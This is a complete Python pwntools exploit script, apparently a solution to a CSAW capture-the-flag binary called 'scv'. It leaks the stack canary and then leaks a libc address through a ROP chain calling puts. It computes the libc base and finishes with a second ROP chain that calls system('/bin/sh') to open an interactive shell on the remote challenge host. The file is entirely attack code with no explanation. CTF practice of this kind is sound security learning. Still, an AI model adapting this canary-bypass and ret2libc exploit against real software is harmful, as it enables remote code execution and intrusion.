from pwn import *
from pwnlib import *

import struct

Remote = True

if Remote:
  p = remote('pwn.chal.csaw.io', 3764)
else:
  p = process('scv')

buf = 0xb0
canary = 0x8
print p.recv()

p.sendline('1')

print p.recv()

# overwrite one byte of the canary
n = buf - canary + 1

p.send('a' * n)

p.recv()

p.sendline('2')

leak = p.recv()

start = leak.find('a' * n)

print start

leaked_canary = struct.pack('B', 0) + leak[start:][n:][:7]

p.sendline('1')

print p.recv()

# Overwrite canary and leak libc

# 0x0000000000400ea3: pop rdi; ret;

puts            = 0x00602018
puts_plt        = 0x004008d0

main_addr = 0x400a96

ropchain = struct.pack('<Q', 0x400ea3) + struct.pack('<Q', puts) + struct.pack('<Q', puts_plt) + struct.pack('<Q', main_addr)
    
p.send(('a' * (n-1)) + leaked_canary + ('a'*8) + ropchain)

p.recv()

p.sendline('3')

leak_libc = p.recv()
print len(leak_libc)

with open('libc', 'w') as f:
  f.write(leak_libc)

puts_addr = leak_libc[0x22:0x22+6]

if Remote:
  puts_ofs   = 0x0006f690
  system_ofs = 0x00045390 
  binsh_ofs  = 0x0018cd17
else:
  puts_ofs   = 0x0006a110
  system_ofs = 0x00040d00
  binsh_ofs  = 0x00167f97

puts_addr = struct.unpack('<Q', puts_addr + '\x00\x00')[0]

print "puts @ {:02x}".format(puts_addr)

libc_addr = puts_addr - puts_ofs

print "libc @ {:02x}".format(libc_addr)

# Go back to main menu and get a shell

p.sendline('1')

print p.recv()

ropchain = struct.pack('<Q', 0x400ea3) + struct.pack('<Q', libc_addr + binsh_ofs) + struct.pack('<Q',libc_addr + system_ofs)

p.send(('a' * (n-1)) + leaked_canary + ('a' * 8) + ropchain)

print p.recv()

p.sendline('3')

p.interactive()

